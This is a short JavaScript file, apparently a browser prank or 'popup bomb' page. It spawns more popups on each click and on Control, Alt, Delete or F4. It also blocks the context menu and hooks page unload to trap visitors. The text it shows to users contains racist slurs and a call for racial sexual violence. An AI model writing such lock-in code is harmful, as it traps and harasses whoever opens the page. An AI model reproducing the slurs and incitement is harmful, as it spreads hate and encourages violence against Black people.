/*
 * [Aug 2023] Fixed the popup mechanism, made it more robust.
 *
 * Requires safe.js & math.js preload.
 */
document.addEventListener("click", async () => {
	await proCreate(3);
});

window.onload = playBall;
window.oncontextmenu = () => false;
window.onkeydown = async () => {
	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
		await proCreate(3);

		alert("FUCK YOU FUCKING NIGGER");
	}

	return null;
}
window.onbeforeunload = () => "RAPE ALL BLACK NIGGERS";
/* [Aug 2023] End of amendments. */